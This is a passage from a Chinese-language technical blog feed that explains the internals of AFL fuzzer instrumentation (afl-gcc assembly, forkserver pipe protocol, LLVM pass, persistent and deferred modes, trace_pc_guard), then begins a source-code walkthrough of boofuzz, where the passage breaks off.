 movq 48(%rsp), %r9<br>  movq 56(%rsp), %r10<br>  movq 64(%rsp), %r11<br><br>  movq  96(%rsp), %xmm0<br>  movq 112(%rsp), %xmm1<br>  movq 128(%rsp), %xmm2<br>  movq 144(%rsp), %xmm3<br>  movq 160(%rsp), %xmm4<br>  movq 176(%rsp), %xmm5<br>  movq 192(%rsp), %xmm6<br>  movq 208(%rsp), %xmm7<br>  movq 224(%rsp), %xmm8<br>  movq 240(%rsp), %xmm9<br>  movq 256(%rsp), %xmm10<br>  movq 272(%rsp), %xmm11<br>  movq 288(%rsp), %xmm12<br>  movq 304(%rsp), %xmm13<br>  movq 320(%rsp), %xmm14<br>  movq 336(%rsp), %xmm15<br><br>  leaq 352(%rsp), %rsp<br><br>  jmp  __afl_store  # 跳转到__afl_store去执行边的记录<br><br>__afl_die:<br><br>  xorq %rax, %rax<br>call _exit@PLT# 调用exit(0)<br></code></pre></td></tr></tbody></table></figure><ul><li><code>__afl_setup_abort</code>：</li></ul><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs assembly">__afl_setup_abort:<br><br>  /* Record setup failure so that we don't keep calling<br>     shmget() / shmat() over and over again. */<br><br>  incb __afl_setup_failure(%rip)  # __afl_setup_failure++;<br>  # 恢复现场<br>  movq %r12, %rsp<br>  popq %r12<br><br>  movq  0(%rsp), %rax<br>  movq  8(%rsp), %rcx<br>  movq 16(%rsp), %rdi<br>  movq 32(%rsp), %rsi<br>  movq 40(%rsp), %r8<br>  movq 48(%rsp), %r9<br>  movq 56(%rsp), %r10<br>  movq 64(%rsp), %r11<br><br>  movq  96(%rsp), %xmm0<br>  movq 112(%rsp), %xmm1<br>  movq 128(%rsp), %xmm2<br>  movq 144(%rsp), %xmm3<br>  movq 160(%rsp), %xmm4<br>  movq 176(%rsp), %xmm5<br>  movq 192(%rsp), %xmm6<br>  movq 208(%rsp), %xmm7<br>  movq 224(%rsp), %xmm8<br>  movq 240(%rsp), %xmm9<br>  movq 256(%rsp), %xmm10<br>  movq 272(%rsp), %xmm11<br>  movq 288(%rsp), %xmm12<br>  movq 304(%rsp), %xmm13<br>  movq 320(%rsp), %xmm14<br>  movq 336(%rsp), %xmm15<br><br>  leaq 352(%rsp), %rsp<br><br>  jmp __afl_return<br><br></code></pre></td></tr></tbody></table></figure><p><code>__afl_maybe_log()</code>伪代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64* __afl_area_ptr;<br>__int64 __afl_prev_loc;<br><span class="hljs-type">int</span> __afl_fork_pid;<br><span class="hljs-type">int</span> __afl_temp;<br>__int8 __afl_setup_failure;<br>__int64* __afl_global_area_ptr;<br><br><span class="hljs-type">void</span> _afl_maybe_log(__int64 random)<br>{<br>    <br>  __int64 flags;<br>  <span class="hljs-type">void</span>* shmaddr;<br>  <br>  v5 = v4;<br>  v6 = __afl_area_ptr;<br>  <span class="hljs-keyword">if</span> ( !__afl_area_ptr )<br>  {<br>    <span class="hljs-keyword">if</span> ( __afl_setup_failure )<br>      <span class="hljs-keyword">return</span>;<br>    <span class="hljs-keyword">if</span> ( __afl_global_area_ptr )<br>    {<br>      __afl_area_ptr = __afl_global_area_ptr;<br>    }<br>    <span class="hljs-keyword">else</span><br>    {<br>      <span class="hljs-type">char</span>* id = getenv(<span class="hljs-string">"__AFL_SHM_ID"</span>);<br>      <span class="hljs-keyword">if</span> ( !id || __afl_area_ptr = shmat(atoi(id), shmaddr, flags) )<br>      {<br>        __afl_setup_failure++;<br>        <span class="hljs-keyword">return</span>;<br>      }<br>      __afl_global_area_ptr = __afl_area_ptr;<br>      <span class="hljs-keyword">if</span> ( write(<span class="hljs-number">199</span>, &amp;_afl_temp, <span class="hljs-number">4</span>) == <span class="hljs-number">4</span> )<br>      {<br>        <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>        {<br>          <span class="hljs-type">int</span> pid = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">198</span>, &amp;_afl_temp, <span class="hljs-number">4</span>) != <span class="hljs-number">4</span> )<br>            <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">if</span> ( __afl_fork_pid = fork() &lt; <span class="hljs-number">0</span> )<br>             <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 退出</span><br>          <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !__afl_fork_pid ){<br>            <span class="hljs-comment">// 子进程</span><br>            close(<span class="hljs-number">198</span>);  <span class="hljs-comment">// 关闭这两个管道</span><br>      close(<span class="hljs-number">199</span>);<br>__afl_area_ptr[random ^ __afl_prev_loc]++;<br>            __afl_prev_loc = random &gt;&gt; <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">return</span>;<br>          }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-comment">// 父进程（forkserver）</span><br>          write(<span class="hljs-number">199</span>, &amp;__afl_fork_pid, <span class="hljs-number">4</span>);  <span class="hljs-comment">// 将pid写入管道? 作用是啥?</span><br>          <span class="hljs-keyword">if</span> ( waitpid(__afl_fork_pid, &amp;__afl_temp, <span class="hljs-number">0</span>) &lt;= <span class="hljs-number">0</span> )<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 退出</span><br>          write(<span class="hljs-number">199</span>, &amp;__afl_temp, <span class="hljs-number">4</span>);     <span class="hljs-comment">// 这里将__afl_temp写回有什么用？</span><br>          }<br>        }<br>      }<br>    }<br>  }<span class="hljs-keyword">else</span>{<br>      __afl_area_ptr[random ^ __afl_prev_loc]++;<br>      __afl_prev_loc = random &gt;&gt; <span class="hljs-number">1</span>;<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 上述插桩残留一个问题：</p><p>​父进程的主要作用是维持一个<code>fork-server</code>，那它与AFL之间通过一个管道进行通信，但通信的具体细节是啥呢？</p><h4 id="4-与AFL通信"><a href="#4-与AFL通信" class="headerlink" title="4. 与AFL通信"></a>4. 与AFL通信</h4><ul><li><p>在AFL中，<code>afl-fuzz</code>中<code>init_forkserver()</code>是初始化forkserver的函数：</p><ul><li>在该函数中，<code>afl-fuzz</code>会<code>fork</code>出一个子进程，并为管道分配新的fd（198 ==&gt; 控制管道<code>ctl_pipe[0]</code>，199 ==&gt; 状态管道<code>st_pipe[0]</code>）。而这个子进程<code>execv</code>一个被测程序，这个被测程序（i.e. fork-server）在调用第一个<code>__afl_maybe_log()</code>函数时，首先会向状态管道写入4字节的任意数据，然后将在while循环中的第一个<code>read(198, &amp;_afl_temp, 4)</code>处阻塞，等待<code>AFL-fuzzer</code>发来信息；</li><li>而在<code>afl-fuzz</code>父进程中，通过读取状态管道4字节的数据来判断是否成功启用<code>fork-server</code></li></ul></li><li><p>在AFL中，<code>run_target()</code>将通知<code>fork-server</code>出一个新的子进程来跑模糊测试生成的测试用例：</p><ul><li><code>afl-fuzz</code>进程将4个字节的超时时间写入到控制管道</li><li><code>fork-server</code>在读取到4个字节（0）之后，将停止阻塞。然后<code>fork()</code>出一个新的子进程来跑实际的被测目标，<code>pid</code>将通过状态管道送回给<code>afl-fuzzer</code>，然后收集覆盖率信息。这里<code>fork-server</code>将这读入的四字节0用于<code>waitpid()</code>的第二个参数，然后等待子进程执行完毕。子进程执行完毕之后，<code>fork-server</code>再向状态管道写入4字节，表明被测程序执行完毕</li><li><code>afl-fuzz</code>根据<code>fork</code>出来的被测程序<code>pid</code>的结束信号和覆盖率信息做进一步的分析处理</li></ul></li><li><p>流程图如下所示。其中 ①→②→③ 为创建<code>fork-server</code>的过程，④→⑤→⑥→⑦→⑧→⑨ 为一次完整的<code>run_target()</code>的过程。</p></li></ul><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/13.png"></p><center name="pic13">图13 AFL与fork-server通信流程图</center><h3 id="b-基于LLVM的插桩"><a href="#b-基于LLVM的插桩" class="headerlink" title="b. 基于LLVM的插桩"></a>b. 基于LLVM的插桩</h3><ul><li>afl-clang-fast、afl-clang-fast++</li><li>基于LLVM <strong>Pass</strong>实现</li></ul><h4 id="1-afl-clang-fast-c"><a href="#1-afl-clang-fast-c" class="headerlink" title="1. afl-clang-fast.c"></a>1. afl-clang-fast.c</h4><ul><li><p>是clang和clang++的一个wrapper，根据具体调用的afl-clang-fast(++)来区分</p><ul><li>afl-clang-fast++是afl-clang-fast的一个软链接，如下所示：</li></ul><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ll afl-clang-fast afl-clang-fast++<br>-rwxrwxr-x 1 chan chan 24608 Nov 28 18:36 afl-clang-fast*<br>lrwxrwxrwx 1 chan chan    14 Nov 28 18:36 afl-clang-fast++ -&gt; afl-clang-fast*<br></code></pre></td></tr></tbody></table></figure></li><li><p>与<strong>llvm Pass</strong>（<code>afl-llvm-pass.so</code>）结合使用：使用<code>-Xclang</code>让clang运行用户自定义的<strong>Pass</strong></p><ul><li>与<code>afl-gcc</code>的区别：Pass在<strong>编译器运行时</strong>进行插桩，而<code>afl-gcc</code>对<strong>编译器运行结束后</strong>生成的汇编文件进行插桩</li></ul></li><li><p><strong>源码解析</strong>：</p><ul><li><p><code>find_obj()</code>：寻找<code>afl-llvm-rt.o</code>目标文件，并将AFL路径保存到<code>obj_path</code>变量中</p></li><li><p><code>edit_params()</code>：构造新的编译命令行选项<code>cc_params</code>，将<code>argv</code>中的选项拷贝到<code>cc_params</code>中，同时提供一些必要的编辑：</p><ul><li><p>首先对<code>argv[0]</code>进行匹配，即进行分流：</p><p><code>afl-clang-fast++</code> =&gt; <code>clang++</code></p><p><code>afl-clang-fast</code> =&gt; <code>clang</code></p></li><li><p>如果使用<code>trace_pc</code>模式，则在<code>cc_params</code>后追加<code>-fsanitize-coverage=trace-pc-guard</code>；否则追加两个选项：<code>-Xclang -load</code>（加载包含插件注册表的动态库）和<code>-Xclang obj_path/afl-llvm-pass.so</code>。此外，还要额外追加一个<code>-Qunused-arguments</code> [20] 选项来静默关于未使用参数的警告。</p></li><li><p>将<code>argv[]</code>中其他的选项拷贝到<code>cc_params</code>，在此期间将更新一些变量值</p></li></ul><table><thead><tr><th>选项</th><th>变量</th></tr></thead><tbody><tr><td>-m32、armv7a-linux-androideabi</td><td>bit_mode = 32</td></tr><tr><td>-m64</td><td>bit_mode = 64</td></tr><tr><td>-x &lt;language&gt; (将输入文件试为某一语言的文件)</td><td>x_set = 1 ==&gt; “-x none”</td></tr><tr><td>-fsanitize=address、-fsanitize=memory</td><td>asan_set = 1</td></tr><tr><td>FORTIFY_SOURCE</td><td>fortify_set = 1</td></tr><tr><td>-Wl,-z,defs</td><td>不追加到<code>cc_params</code>中</td></tr><tr><td>-Wl,–no-undefined</td><td>不追加到<code>cc_params</code>中</td></tr></tbody></table><ul><li>后面追加的一些选项与<code>afl-gcc</code>相似，不再赘述。这里需要注意的是，如果使用了<code>trace pc</code>模式，<code>AFL_INST_RATIO</code>将不可使用。<code>afl-clang-fast</code>使用<code>-D</code>选项向<code>cc_params</code>追加了一些隐式的<code>#define</code>，分别是：</li></ul><table><thead><tr><th>值</th></tr></thead><tbody><tr><td>__AFL_HAVE_MANUAL_CONTROL=1</td></tr><tr><td>__AFL_COMPILER=1</td></tr><tr><td>FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</td></tr><tr><td>__AFL_LOOP(_A)=({ static volatile char *_B __attribute__((used)); _B = (char*) “##SIG_AFL_PERSISTENT##”; __attribute__((visibility("default"))) int _L(unsigned int) __asm__("__afl_persistent_loop"); _L(_A); })</td></tr><tr><td>__AFL_INIT()=do  { static volatile char *_A __attribute__((used));   _A = (char*) “##SIG_AFL_DEFER_FORKSRV##”; __attribute__((visibility("default")))  void _I(void) __asm__("__afl_manual_init"); _I(); } while (0)</td></tr></tbody></table><ul><li>最后，根据<code>bit_mode</code>向<code>cc_params</code>后追加对应的目标文件 [ 默认为 <code>afl-llvm-rt.o</code>，32位 <code>afl-llvm-rt-32.o</code>，64位 <code>afl-llvm-rt-64.o</code> ]</li></ul></li><li><p><code>execvp()</code>：执行构造的命令行，即<code>cc_params</code>。该命令行通过<code>-Xclang</code>运行<strong>Pass</strong>，然后将<code>afl-llvm-rt.o</code>目标文件链接到最终生成的<code>afl-clang-fast</code>。</p><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 这里有个问题，<code>afl-llvm-pass.so.cc</code>的作用显而易见，就是构造执行<strong>Pass</strong>插桩的动态链接库，但目标文件<code>afl-llvm-rt.o</code>的作用是什么呢？</p></li></ul></li></ul><h4 id="2-afl-llvm-pass-so-cc"><a href="#2-afl-llvm-pass-so-cc" class="headerlink" title="2. afl-llvm-pass.so.cc"></a>2. afl-llvm-pass.so.cc</h4><ul><li><p>生成执行插桩<strong>Pass</strong>的动态链接库</p></li><li><p><code>AFLCoverage::runOnModule</code>：用于执行转换（插桩）</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 创建两个全局变量：</p><p><code>__afl_area_ptr</code> 用于保存共享内存区域的地址；<code>__afl_prev_loc</code>用于存放前一个基本块ID右移一位的值</p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 遍历所有基本块BB：</p><ul><li>随机生成一个基本块ID值<code>cur_loc</code></li><li>载入全局变量<code>__afl_prev_loc</code></li><li>载入全局共享内存区域指针<code>__afl_area_ptr</code>，计算值<code>cur_loc xor __afl_prev_loc</code></li><li>更新比特位图：将上述计算值作为索引，在<code>__afl_area_ptr</code>中寻址，让对应的字节值+1</li><li>更新<code>__afl_prev_loc</code>的值：<code>__afl_prev_loc = cur_loc &gt;&gt; 1</code></li></ul></li><li><p><code>registerAFLPass</code>用来注册该<strong>AFLCoverage Pass</strong>类</p></li></ul><h4 id="3-afl-llvm-rt-o-c"><a href="#3-afl-llvm-rt-o-c" class="headerlink" title="3. afl-llvm-rt.o.c"></a>3. afl-llvm-rt.o.c</h4><ul><li><p>该文件的主要作用有：</p><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 在被测目标程序执行之前调用<code>__afl_auto_init()</code>初始化函数：</p><ul><li>使用<code>__attribute__((constructor(CONST_PRIO)))</code>关键字，让该函数在被测目标程序调用<code>main()</code>函数之前执行 [21]</li><li>调用<code>__afl_manual_init()</code>函数：<ul><li><code>__afl_map_shm()</code>函数用来获取共享内存区域地址</li><li><code>__afl_start_forkserver()</code>函数用来启动<code>fork-server</code>，其整体逻辑与<a href="#pic13">图13</a>一样，此处不再赘述【注：这里是死循环，用来<code>fork</code>子进程】</li></ul></li></ul><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Persistent mode</strong></p><ul><li><p>在源文件中设置<code>__AFL_LOOP(int)</code>后启用</p></li><li><p>如前所述，<code>afl-clang-fast</code>在编译目标程序时，会使用<code>-D</code>选项引入一个<code>#define __AFL_LOOP(_A)</code>的宏定义，该宏定义会将源代码中的<code>__AFL_LOOP(int)</code>替换为<code>__afl_persistent_loop(int)</code>【通常<code>__AFL_LOOP()</code>与<code>while()</code>结合使用】</p></li><li><p><code>int __afl_persistent_loop(unsigned int max_cnt)</code>：</p><ul><li>在第一次调用该函数时，该函数会清空<code>__afl_area_ptr</code>的值，即清空覆盖率跟踪位图信息（在达到<code>__AFL_LOOP()</code>之前的所有覆盖率信息都将被清空），然后将<code>__afl_area_ptr[0]</code>置为1，<code>__afl_prev_loc</code>置为0</li><li>在非第一次调用该函数时（如与<code>while()</code>循环一起使用时），说明前一轮的覆盖率信息已经统计完成，在轮数不为0的情况下，首先<code>raise(SIGSTOP)</code>，表示程序暂停，然后<code>fork-server</code>的<code>waitpid</code>将直接返回，程序仍在运行中，然后该覆盖率信息将被AFL处理，同时生成下一个测试用例投喂给目标程序</li><li><code>fork-server</code>再接收到AFL生成了新的测试用例并需要运行目标程序的消息之后，由于先前的程序处于暂停状态，<code>fork-server</code>将不会<code>fork()</code>一个新的子进程，而是向之前暂停的子进程发送<code>SIGCONT</code>（继续运行）的信号，然后又回到上一步的循环中，直到循环次数结束</li><li>循环次数结束后，<code>__afl_area_ptr</code>会重定向到一个虚假的位图<code>__afl_area_initial</code>中，避免收集<code>__AFL_LOOP()</code>后面执行的代码覆盖率</li></ul></li><li><p>代码：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">1000</span>)) {<br>   <span class="hljs-comment">// AFL只会统计该循环中的代码覆盖率</span><br>    <span class="hljs-comment">// 优点：速度快，避免频繁的调用程序的初始化操作；</span><br>    <span class="hljs-comment">//      能够通过一定数量输入的投喂使得程序到达某一状态，因此可以覆盖到更深层次的代码（这对于网络程序来说具有奇效）</span><br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p>流程图：</p><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/14.png"></p><center>图14 persistent mode流程图</center></li></ul><p><span class="github-emoji"><span>3⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Deferred forkserver模式</strong>：</p><ul><li><p>由环境变量<code>__AFL_DEFER_FORKSRV</code>控制，用于控制在何时启动forkserver，避免一些长时间的初始化操作影响吞吐量</p></li><li><pre><code class="c">__AFL_INIT(); // the forkserver will be raised here!// do something ...</code></pre></li></ul><p><span class="github-emoji"><span>4⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0034-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>trace_pc_guard模式</strong>：</p><ul><li><p>trace_pc_guard模式对所有的边进行插桩，插桩值为guard</p></li><li><p><code>__sanitizer_cov_trace_pc_guard_init(start, stop)</code>：</p><ul><li>替换每个<code>trace_pc</code>处的<code>guard</code>值（随机数），不进行插桩的<code>guard</code>值设置为0</li></ul></li><li><p><code>__sanitizer_cov_trace_pc_guard(guard)</code>：</p><ul><li>更新共享内存数据：对比特位图中索引为<code>guard</code>的字节+1</li></ul></li></ul><p>trace_pc_guard编译过程中遇到的问题：</p><ol><li><p>makefile 中定义 <code>AFL_TRACE_PC = 1</code></p></li><li><p>如果输出如下显示，则将afl-clang-fast.c 的第133行替换为：<code>c_params[cc_par_cnt++] = "-sanitizer-coverage-level=0";</code> </p><blockquote><p>clang (LLVM option parsing): Unknown command line argument ‘-sanitizer-coverage-block-threshold=0’.  Try: ‘clang (LLVM option parsing) -help’<br>clang (LLVM option parsing): Did you mean ‘-sanitizer-coverage-pc-table=0’?</p></blockquote></li></ol></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><ol><li><p><a href="https://en.wikibooks.org/wiki/GNU_C_Compiler_Internals/Print_version">GNU C 编译器内部/打印版 - 维基教科书，开放世界的开放书籍 (wikibooks.org)</a></p></li><li><p><a href="https://stackoverflow.com/questions/34502255/ast-from-c-code-with-preprocessor-directives">gcc - AST from c code with preprocessor directives - Stack Overflow</a></p></li><li><p><a href="https://stackoverflow.com/questions/15800230/how-can-i-dump-an-abstract-syntax-tree-generated-by-gcc-into-a-dot-file">graphviz - How can I dump an abstract syntax tree generated by gcc into a .dot file? - Stack Overflow</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gccint/GIMPLE.html">GIMPLE (GNU Compiler Collection (GCC) Internals)</a></p></li><li><p><a href="https://wiki.aalto.fi/pages/viewpage.action?pageId=55374641">GCC GENERIC - Advanced course on compilers - Aalto University Wiki</a></p></li><li><p><a href="https://blog.csdn.net/qq_36287943/article/details/105458166">GCC - GIMPLE IR 学习一_zhugl0的博客-CSDN博客_gimple</a></p></li><li><p><a href="https://wiki.aalto.fi/pages/viewpage.action?pageId=55375140">GCC RTL - Advanced course on compilers - Aalto University Wiki</a></p></li><li><p><a href="https://www.cs.nmsu.edu/~rth/cs/cs271/notes/Compiling.html">CS271: Compiling (nmsu.edu)</a></p></li><li><p><a href="https://getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io/zh_CN/latest/ch04.html">第4章 前端 — Getting Started with LLVM Core Libraries 文档 (getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io)</a></p></li><li><p><a href="https://stackoverflow.com/questions/14163208/how-to-link-c-object-files-with-ld">linker - How to link C++ object files with ld - Stack Overflow</a></p></li><li><p><a href="https://getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io/zh_CN/latest/ch05.html">第5章 LLVM中间表示 — Getting Started with LLVM Core Libraries 文档 (getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io)</a></p></li><li><p><a href="https://getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io/zh_CN/latest/ch06.html">第6章 后端 — Getting Started with LLVM Core Libraries 文档 (getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io)</a></p></li><li><p><a href="https://discourse.llvm.org/t/llc-view-dag-combine1-dags/1876/5">LLC -view-dag-combine1-dags - Beginners - LLVM Discussion Forums</a></p></li><li><p><a href="https://blog.csdn.net/weixin_46222091/article/details/104414187">指令调度概念原理介绍_ronnie88597的博客-CSDN博客</a></p></li><li><p><a href="https://mudongliang.github.io/2016/05/24/stack-protector.html">GCC Stack Protector options (mudongliang.github.io)</a></p></li><li><p><a href="https://stackoverflow.com/questions/24787769/what-are-lfb-lbb-lbe-lvl-loc-in-the-compiler-generated-assembly-code">c - What are .LFB .LBB .LBE .LVL .loc in the compiler generated assembly code - Stack Overflow</a></p></li><li><p><a href="https://sourceware.org/binutils/docs-2.18/as/LNS-directives.html#LNS-directives">LNS directives - Using as (sourceware.org)</a></p></li><li><p><a href="https://sourceware.org/binutils/docs-2.18/as/Symbol-Names.html">Symbol Names - Using as (sourceware.org)</a></p></li><li><p><a href="https://github.com/gcc-mirror/gcc/blob/master/gcc/dwarf2out.cc">gcc/gcc at master · gcc-mirror/gcc (github.com)</a></p></li><li><p><a href="https://clang.llvm.org/docs/genindex.html">Index — Clang 16.0.0git documentation (llvm.org)</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-6.2.0/gcc/Common-Function-Attributes.html">Common Function Attributes - Using the GNU Compiler Collection (GCC)</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>AFL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Boofuzz源码解析</title>
    <link href="/2022/09/27/Boofuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/09/27/Boofuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="boofuzz源码分析"><a href="#boofuzz源码分析" class="headerlink" title="boofuzz源码分析"></a>boofuzz源码分析</h1><p>以<code>ftp_simple.py</code>为例：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">session = Session(target=Target(connection=TCPSocketConnection(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">21</span>)))  <span class="hljs-comment"># 创建session</span><br><br>define_proto(session=session)  <span class="hljs-comment"># 定义proto</span><br><br>session.fuzz()<span class="hljs-comment"># 开始模糊测试</span><br></code></pre></td></tr></tbody></table></figure><p>其中，<code>define_proto()</code> 将调用<code>session.connect()</code>构造调用流图。如果<code>connect(node1)</code>的参数只有只有一个，那么该节点将保存在<code>self.nodes</code>变量中，同时会创建<code>self.root</code>到该节点的边；如果<code>connect(node1, node2)</code>，node1和node2节点信息都将保存在<code>self.nodes</code>变量中，同时会创建node1到node2的边</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">session.connect(user)<br>   session.connect(user, passw)<br>   session.connect(passw, stor)<br>   session.connect(passw, retr)<br></code></pre></td></tr></tbody></table></figure><p><code>session.fuzz()</code>核心代码在<code>_main_fuzz_loop</code>中</p><p>在<code>_main_fuzz_loop</code>中：</p><p><code>self.server_init()</code>：启动<code>web_interface_thread</code>（网络接口线程：默认为localhost:26000）</p><p><code>self._start_target()</code>：启动一个boofuzz.sessions.Target实例</p><p>相关变量</p><table><thead><tr><th>变量名</th><th>含义</th></tr></thead><tbody><tr><td>self.num_cases_actually_fuzzed</td><td>实际fuzz的测试用例数</td></tr><tr><td>mutation_context</td><td>变异上下文</td></tr><tr><td>fuzz_case_iterator</td><td>fuzz测试用例迭代器</td></tr></tbody></table><p>遍历<code>fuzz_case_iterator</code>中的<code>mutation_context</code>，</p><ul><li><p>如果设置了<code>restart_interval</code>，表明每次运行<code>restart_interval</code>个测试用例后重启target</p></li><li><p><code>_fuzz_current_case()</code>函数对当前的测试用例进行模糊测试，而该测试用例由<code>fuzz_case_iterator</code>控制：</p><ul><li><p><code>_pause_if_pause_flag_is_set()</code>函数<code>pause flag</code>是否被唤起，如果被唤起，则进入一个无限循环中等待其变为False（Why？）</p></li><li><p><code>self._test_case_name()</code>函数用于构造测试用例名，测试用例名字格式为：<code>message_path:[qualified_name1:mutation.index1,  qualified_name2:mutation.index2, ...]</code>，例如<code>user:[user.key:0]</code></p></li><li><p><code>self._fuzz_data_logger.open_test_case()</code>记录测试用例，默认是讲保存插入测试用例信息的sql语句添加到<code>self._queue</code>队列中。（在何处执行？在<a 